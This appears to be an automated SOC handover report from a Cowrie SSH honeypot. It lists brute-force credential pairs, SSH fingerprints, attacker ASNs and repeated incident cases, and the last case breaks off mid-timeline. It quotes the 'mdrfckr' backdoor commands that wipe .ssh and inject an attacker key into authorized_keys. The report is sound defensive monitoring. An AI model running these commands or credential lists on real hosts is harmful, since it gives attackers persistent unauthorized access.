# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-29 |
| **Generated At** | 2026-07-29T19:22:56Z |
| **Shift Time** | 19:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **238** |
| Confirmed Threats | **225** |
| False Positives Filtered | **13** (5.5%) |
| Unique Attacker IPs | **75** |
| Countries of Origin | **27** |
| High Severity Cases | **151** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **87** |
| Malware Samples Analyzed | **3** HIGH · **30** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **167** |
| Unique Credential Pairs | **120** |
| Unique Usernames | **61** |
| Unique Passwords | **89** |
| Successful Auth Pairs | **152** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 30 |
| `admin` | 21 |
| `support` | 10 |
| `user` | 6 |
| `supervisor` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 13 |
| `1234` | 7 |
| `123456` | 7 |
| `password` | 6 |
| `123` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 8 |
| `config` | `config99` | 5 |
| `lghkel	` | `zpz}ld	` | 5 |
| `support` | `support` | 4 |
| `default` | `default` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `cloud-user` | `password` | `77.239.124.235` | 2026-07-29T16:55:05 |
| `git` | `123` | `77.239.124.235` | 2026-07-29T16:55:11 |
| `root` | `root@2026` | `77.239.124.235` | 2026-07-29T16:55:16 |
| `cloud` | `1234` | `77.239.124.235` | 2026-07-29T16:55:22 |
| `root` | `asdfasdf-space` | `77.239.124.235` | 2026-07-29T16:55:28 |
| `postgres` | `123456` | `77.239.124.235` | 2026-07-29T16:55:34 |
| `minecraft` | `1234` | `77.239.124.235` | 2026-07-29T16:55:39 |
| `odoo17` | `12345` | `77.239.124.235` | 2026-07-29T16:55:46 |
| `user` | `123456` | `77.239.124.235` | 2026-07-29T16:55:53 |
| `pi` | `pi` | `77.239.124.235` | 2026-07-29T16:55:59 |
| `app` | `123` | `77.239.124.235` | 2026-07-29T16:56:06 |
| `user` | `root` | `77.239.124.235` | 2026-07-29T16:56:12 |
| `rdpuser` | `123` | `77.239.124.235` | 2026-07-29T16:56:18 |
| `asterisk` | `asterisk` | `77.239.124.235` | 2026-07-29T16:56:24 |
| `deployer` | `deployer123` | `77.239.124.235` | 2026-07-29T16:56:30 |
| `root` | `aa123456` | `77.239.124.235` | 2026-07-29T16:56:36 |
| `rdpuser` | `rdpuser` | `77.239.124.235` | 2026-07-29T16:56:42 |
| `root` | `0987654321` | `77.239.124.235` | 2026-07-29T16:56:47 |
| `runner` | `test` | `77.239.124.235` | 2026-07-29T16:56:53 |
| `root` | `qazwsxedc` | `77.239.124.235` | 2026-07-29T16:56:59 |
| `media` | `rock` | `77.239.124.235` | 2026-07-29T16:57:05 |
| `root` | `abc123` | `77.239.124.235` | 2026-07-29T16:57:12 |
| `dev` | `111111` | `77.239.124.235` | 2026-07-29T16:57:19 |
| `root` | `Aaaa1111` | `77.239.124.235` | 2026-07-29T16:57:27 |
| `vbox` | `123456` | `77.239.124.235` | 2026-07-29T16:57:34 |
| `uftp` | `uftp` | `77.239.124.235` | 2026-07-29T16:57:41 |
| `test` | `test123` | `77.239.124.235` | 2026-07-29T16:57:47 |
| `user3` | `12345678` | `77.239.124.235` | 2026-07-29T16:57:54 |
| `root` | `1029384756` | `77.239.124.235` | 2026-07-29T16:58:01 |
| `openvpn` | `12345678` | `77.239.124.235` | 2026-07-29T16:58:08 |
| `git` | `1234` | `77.239.124.235` | 2026-07-29T16:58:15 |
| `www` | `123321` | `77.239.124.235` | 2026-07-29T16:58:21 |
| `root` | `eve` | `77.239.124.235` | 2026-07-29T16:58:28 |
| `lin` | `123456` | `77.239.124.235` | 2026-07-29T16:58:35 |
| `student` | `student123` | `77.239.124.235` | 2026-07-29T16:58:42 |
| `deploy` | `123` | `77.239.124.235` | 2026-07-29T16:58:49 |
| `root` | `redhat` | `77.239.124.235` | 2026-07-29T16:58:55 |
| `rocky` | `1` | `77.239.124.235` | 2026-07-29T16:59:02 |
| `user` | `123` | `77.239.124.235` | 2026-07-29T16:59:09 |
| `admin` | `Admin@123` | `24.142.170.231` | 2026-07-29T16:59:11 |
| `trade` | `123456` | `77.239.124.235` | 2026-07-29T16:59:15 |
| `admin` | `Admin@123` | `36.92.35.211` | 2026-07-29T16:59:21 |
| `pi` | `toor` | `77.239.124.235` | 2026-07-29T16:59:22 |
| `ubuntu` | `Ubuntu123!` | `77.239.124.235` | 2026-07-29T16:59:29 |
| `deployer` | `deployer` | `77.239.124.235` | 2026-07-29T16:59:36 |
| `user3` | `user3` | `77.239.124.235` | 2026-07-29T16:59:43 |
| `root` | `P@ssword` | `77.239.124.235` | 2026-07-29T16:59:49 |
| `admin1` | `admin1` | `77.239.124.235` | 2026-07-29T16:59:55 |
| `tester` | `12345` | `77.239.124.235` | 2026-07-29T17:00:02 |
| `admin` | `051178` | `77.239.124.235` | 2026-07-29T17:00:09 |
| `hduser` | `hduser` | `77.239.124.235` | 2026-07-29T17:00:16 |
| `root` | `aA123456` | `77.239.124.235` | 2026-07-29T17:00:23 |
| `martin` | `martin` | `77.239.124.235` | 2026-07-29T17:00:29 |
| `root` | `Aa123321` | `77.239.124.235` | 2026-07-29T17:00:36 |
| `ftp` | `ftp123` | `77.239.124.235` | 2026-07-29T17:00:44 |
| `testuser` | `test` | `77.239.124.235` | 2026-07-29T17:00:51 |
| `martin` | `123456` | `77.239.124.235` | 2026-07-29T17:00:58 |
| `user` | `git` | `77.239.124.235` | 2026-07-29T17:01:05 |
| `frappe` | `123` | `77.239.124.235` | 2026-07-29T17:01:11 |
| `main` | `1234` | `77.239.124.235` | 2026-07-29T17:01:17 |
| `odoo16` | `odoo16` | `77.239.124.235` | 2026-07-29T17:01:24 |
| `unknown` | `webadmin` | `181.129.31.42` | 2026-07-29T17:01:42 |
| `supervisor` | `159753` | `10.0.0.73` | 2026-07-29T17:02:39 |
| `support` | `support` | `176.53.159.196` | 2026-07-29T17:04:40 |
| `admin` | `admin` | `27.79.2.68` | 2026-07-29T17:14:50 |
| `support` | `support` | `10.0.0.73` | 2026-07-29T17:14:52 |
| `samba` | `samba@123` | `187.174.238.116` | 2026-07-29T17:16:11 |
| `345gs5662d34` | `345gs5662d34` | `187.174.238.116` | 2026-07-29T17:16:14 |
| `samba` | `3245gs5662d34` | `187.174.238.116` | 2026-07-29T17:16:14 |
| `root` | `admin` | `171.243.150.132` | 2026-07-29T17:17:19 |
| `ito` | `ito` | `187.34.131.136` | 2026-07-29T17:17:21 |
| `345gs5662d34` | `345gs5662d34` | `187.34.131.136` | 2026-07-29T17:17:24 |
| `ito` | `3245gs5662d34` | `187.34.131.136` | 2026-07-29T17:17:26 |
| `unknown` | `webadmin` | `136.185.6.181` | 2026-07-29T17:18:36 |
| `installer` | `installer` | `171.243.150.132` | 2026-07-29T17:19:48 |
| `default` | `default` | `10.0.0.73` | 2026-07-29T17:20:13 |
| `user` | `user` | `171.243.150.132` | 2026-07-29T17:20:32 |
| `supervisor` | `159753` | `186.215.107.189` | 2026-07-29T17:21:41 |
| `supervisor` | `159753` | `187.115.144.103` | 2026-07-29T17:21:59 |
| `ubnt` | `ubnt` | `27.79.2.68` | 2026-07-29T17:22:56 |
| `supervisor` | `112233` | `117.39.63.46` | 2026-07-29T17:23:07 |
| `default` | `default` | `36.92.35.211` | 2026-07-29T17:25:22 |
| `config` | `config` | `171.243.150.132` | 2026-07-29T17:25:57 |
| `squid` | `squid` | `27.79.2.68` | 2026-07-29T17:26:25 |
| `radius` | `1234` | `45.78.235.121` | 2026-07-29T17:27:26 |
| `345gs5662d34` | `345gs5662d34` | `45.78.235.121` | 2026-07-29T17:27:30 |
| `radius` | `3245gs5662d34` | `45.78.235.121` | 2026-07-29T17:27:32 |
| `root` | `@` | `27.79.2.68` | 2026-07-29T17:31:56 |
| `default` | `default` | `58.22.255.28` | 2026-07-29T17:33:12 |
| `default` | `default` | `111.171.125.94` | 2026-07-29T17:33:26 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-29T17:33:39 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-29T17:33:39 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-29T17:33:40 |
| `admin` | `admin@123` | `27.79.2.68` | 2026-07-29T17:34:02 |
| `admin` | `admin` | `222.187.115.202` | 2026-07-29T17:35:20 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-29T17:35:21 |
| `mysql` | `password` | `202.111.183.30` | 2026-07-29T17:37:01 |
| `mysql` | `password` | `95.35.29.192` | 2026-07-29T17:37:14 |
| `root` | `root123` | `27.79.2.68` | 2026-07-29T17:37:58 |
| `admin` | `admin` | `47.77.182.54` | 2026-07-29T17:38:14 |
| `system` | `OkwKcECs8qJP2Z` | `171.243.150.132` | 2026-07-29T17:39:45 |
| `guest` | `guest` | `171.243.150.132` | 2026-07-29T17:42:26 |
| `test` | `test` | `27.79.2.68` | 2026-07-29T17:44:36 |
| `admin` | `0l0ctyQh243O63uD` | `27.79.2.68` | 2026-07-29T17:45:34 |
| `admin` | `password` | `171.243.150.132` | 2026-07-29T17:47:31 |
| `admin` | `1234` | `171.243.150.132` | 2026-07-29T17:50:14 |
| `admin` | `admin01` | `27.79.2.68` | 2026-07-29T17:51:27 |
| `admin` | `admin` | `159.75.211.148` | 2026-07-29T17:52:12 |
| `mysql` | `password` | `83.166.50.15` | 2026-07-29T17:53:39 |
| `mysql` | `password` | `111.70.32.51` | 2026-07-29T17:53:47 |
| `admin` | `123456` | `171.243.150.132` | 2026-07-29T17:54:17 |
| `admin` | `admin123` | `171.243.150.132` | 2026-07-29T17:55:49 |
| `supervisor` | `qwerty1` | `186.103.136.43` | 2026-07-29T17:56:43 |
| `supervisor` | `qwerty1` | `191.241.142.170` | 2026-07-29T17:56:52 |
| `user` | `1234` | `27.79.2.68` | 2026-07-29T17:58:12 |
| `ftp` | `ftp` | `171.243.150.132` | 2026-07-29T18:00:44 |
| `admin` | `default` | `27.79.2.68` | 2026-07-29T18:00:49 |
| `root` | `VPS@inet.vn` | `27.50.29.181` | 2026-07-29T18:02:48 |
| `operator` | `operator` | `171.243.150.132` | 2026-07-29T18:04:29 |
| `support` | `admin` | `27.79.2.68` | 2026-07-29T18:04:40 |
| `admin` | `admin123` | `41.214.10.178` | 2026-07-29T18:07:09 |
| `admin` | `admin123` | `118.113.164.137` | 2026-07-29T18:07:19 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-29T18:08:39 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-29T18:08:39 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-29T18:08:50 |
| `root` | `abcd1234` | `171.243.150.132` | 2026-07-29T18:09:03 |
| `ubnt` | `admin` | `10.0.0.73` | 2026-07-29T18:10:30 |
| `ubnt` | `admin` | `122.187.229.12` | 2026-07-29T18:12:11 |
| `ubnt` | `admin` | `77.106.78.215` | 2026-07-29T18:12:24 |
| `admin` | `admin` | `47.252.16.44` | 2026-07-29T18:22:49 |
| `config` | `config99` | `10.0.0.73` | 2026-07-29T18:27:57 |
| `23` | `root` | `94.154.43.140` | 2026-07-29T18:30:42 |
| `debian` | `debian13` | `103.67.152.201` | 2026-07-29T18:31:34 |
| `debian` | `debian13` | `14.99.61.248` | 2026-07-29T18:31:47 |
| `support` | `abc@1234` | `50.187.155.130` | 2026-07-29T18:32:48 |
| `support` | `abc@1234` | `186.215.107.189` | 2026-07-29T18:32:55 |
| `config` | `config99` | `122.160.50.155` | 2026-07-29T18:32:57 |
| `config` | `config99` | `116.7.248.50` | 2026-07-29T18:33:07 |
| `root` | `7ujMko0admin` | `222.99.31.54` | 2026-07-29T18:33:31 |
| `default` | `S2fGqNFs` | `222.99.31.54` | 2026-07-29T18:34:05 |
| `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `222.99.31.54` | 2026-07-29T18:34:39 |
| `lghkel	` | `zpz}ld	` | `222.99.31.54` | 2026-07-29T18:34:40 |
| `root` | `ivdev` | `222.99.31.54` | 2026-07-29T18:35:13 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\xdf\xda\xd3\xd7\xd0\x8f\x8c\x8d'` | `222.99.31.54` | 2026-07-29T18:35:47 |
| `b'\xcc\xd1\xd1\xca'` | `b'\x8c\x8e\x8e\x86\x8e\x86\x8c\x88'` | `222.99.31.54` | 2026-07-29T18:36:21 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\x8f\x8c\x8d\x8a\x8b'` | `222.99.31.54` | 2026-07-29T18:36:55 |
| `root` | `GM8182` | `222.99.31.54` | 2026-07-29T18:37:29 |
| `guest` | `guest` | `222.99.31.54` | 2026-07-29T18:38:03 |
| `support` | `54321` | `59.46.182.10` | 2026-07-29T18:38:17 |
| `config` | `config99` | `119.200.229.33` | 2026-07-29T18:40:58 |
| `guest` | `123654` | `10.0.0.73` | 2026-07-29T18:45:30 |
| `support` | `54321` | `10.0.0.73` | 2026-07-29T18:49:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **238** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 68 |
| OpenSSH | 28 |
| AsyncSSH (Python) | 28 |
| libssh | 17 |
| Paramiko (Python) | 8 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 59 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 28 | 26 |
| `fda360b1b4f4...` | Mirai/variant | 28 | 2 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 59 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 28 | 26 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 28 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `19532158b559...` | libssh | 3 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `187.34.131.136`, `187.174.238.116`, `45.78.235.121`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **75** |
| Unique ASNs | **52** |
| High-Risk ASNs | **46** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS35042` | Layer7 Networks GmbH | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS7552` | Viettel Group | 2 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (151)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-90ef299b8966

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:55 |
| **Last Seen** | 2026-07-29 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:55:05` | `cowrie.session.connect` |
| `2026-07-29 16:55:05` | `cowrie.client.version` |
| `2026-07-29 16:55:05` | `cowrie.client.kex` |
| `2026-07-29 16:55:05` | `cowrie.login.success` |
| `2026-07-29 16:55:06` | `cowrie.session.params` |
| `2026-07-29 16:55:06` | `cowrie.command.input` |
| `2026-07-29 16:55:06` | `cowrie.log.closed` |
| `2026-07-29 16:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aaebd4f9c5d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:55 |
| **Last Seen** | 2026-07-29 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:55:10` | `cowrie.session.connect` |
| `2026-07-29 16:55:10` | `cowrie.client.version` |
| `2026-07-29 16:55:11` | `cowrie.client.kex` |
| `2026-07-29 16:55:11` | `cowrie.login.success` |
| `2026-07-29 16:55:12` | `cowrie.session.params` |
| `2026-07-29 16:55:12` | `cowrie.command.input` |
| `2026-07-29 16:55:12` | `cowrie.log.closed` |
| `2026-07-29 16:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7eff3144b14

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:55 |
| **Last Seen** | 2026-07-29 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:55:16` | `cowrie.session.connect` |
| `2026-07-29 16:55:16` | `cowrie.client.version` |
| `2026-07-29 16:55:16` | `cowrie.client.kex` |
| `2026-07-29 16:55:16` | `cowrie.login.success` |
| `2026-07-29 16:55:17` | `cowrie.session.params` |
| `2026-07-29 16:55:17` | `cowrie.command.input` |
| `2026-07-29 16:55:17` | `cowrie.log.closed` |
| `2026-07-29 16:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3f94ee1a13b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:55 |
| **Last Seen** | 2026-07-29 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:55:21` | `cowrie.session.connect` |
| `2026-07-29 16:55:22` | `cowrie.client.version` |
| `2026-07-29 16:55:22` | `cowrie.client.kex` |
| `2026-07-29 16:55:22` | `cowrie.login.success` |
| `2026-07-29 16:55:23` | `cowrie.session.params` |
| `2026-07-29 16:55:23` | `cowrie.command.input` |
| `2026-07-29 16:55:23` | `cowrie.log.closed` |
| `2026-07-29 16:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4ce2736dfc8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:55 |
| **Last Seen** | 2026-07-29 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:55:27` | `cowrie.session.connect` |
| `2026-07-29 16:55:27` | `cowrie.client.version` |
| `2026-07-29 16:55:27` | `cowrie.client.kex` |
| `2026-07-29 16:55:28` | `cowrie.login.success` |
| `2026-07-29 16:55:28` | `cowrie.session.params` |
| `2026-07-29 16:55:28` | `cowrie.command.input` |
| `2026-07-29 16:55:28` | `cowrie.log.closed` |
| `2026-07-29 16:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d816198e181

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:55 |
| **Last Seen** | 2026-07-29 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:55:33` | `cowrie.session.connect` |
| `2026-07-29 16:55:33` | `cowrie.client.version` |
| `2026-07-29 16:55:33` | `cowrie.client.kex` |
| `2026-07-29 16:55:34` | `cowrie.login.success` |
| `2026-07-29 16:55:35` | `cowrie.session.params` |
| `2026-07-29 16:55:35` | `cowrie.command.input` |
| `2026-07-29 16:55:35` | `cowrie.log.closed` |
| `2026-07-29 16:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5cac44b9f8f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:55 |
| **Last Seen** | 2026-07-29 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:55:39` | `cowrie.session.connect` |
| `2026-07-29 16:55:39` | `cowrie.client.version` |
| `2026-07-29 16:55:39` | `cowrie.client.kex` |
| `2026-07-29 16:55:39` | `cowrie.login.success` |
| `2026-07-29 16:55:40` | `cowrie.session.params` |
| `2026-07-29 16:55:40` | `cowrie.command.input` |
| `2026-07-29 16:55:40` | `cowrie.log.closed` |
| `2026-07-29 16:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-674e13858fe2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:55 |
| **Last Seen** | 2026-07-29 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:55:46` | `cowrie.session.connect` |
| `2026-07-29 16:55:46` | `cowrie.client.version` |
| `2026-07-29 16:55:46` | `cowrie.client.kex` |
| `2026-07-29 16:55:46` | `cowrie.login.success` |
| `2026-07-29 16:55:47` | `cowrie.session.params` |
| `2026-07-29 16:55:47` | `cowrie.command.input` |
| `2026-07-29 16:55:47` | `cowrie.log.closed` |
| `2026-07-29 16:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7981ecf80e0

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:55 |
| **Last Seen** | 2026-07-29 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:55:53` | `cowrie.session.connect` |
| `2026-07-29 16:55:53` | `cowrie.client.version` |
| `2026-07-29 16:55:53` | `cowrie.client.kex` |
| `2026-07-29 16:55:53` | `cowrie.login.success` |
| `2026-07-29 16:55:54` | `cowrie.session.params` |
| `2026-07-29 16:55:54` | `cowrie.command.input` |
| `2026-07-29 16:55:54` | `cowrie.log.closed` |
| `2026-07-29 16:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0495f4670da

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:55 |
| **Last Seen** | 2026-07-29 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:55:59` | `cowrie.session.connect` |
| `2026-07-29 16:55:59` | `cowrie.client.version` |
| `2026-07-29 16:55:59` | `cowrie.client.kex` |
| `2026-07-29 16:55:59` | `cowrie.login.success` |
| `2026-07-29 16:56:00` | `cowrie.session.params` |
| `2026-07-29 16:56:00` | `cowrie.command.input` |
| `2026-07-29 16:56:00` | `cowrie.log.closed` |
| `2026-07-29 16:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eded216b5eeb

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:56 |
| **Last Seen** | 2026-07-29 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:56:05` | `cowrie.session.connect` |
| `2026-07-29 16:56:05` | `cowrie.client.version` |
| `2026-07-29 16:56:05` | `cowrie.client.kex` |
| `2026-07-29 16:56:06` | `cowrie.login.success` |
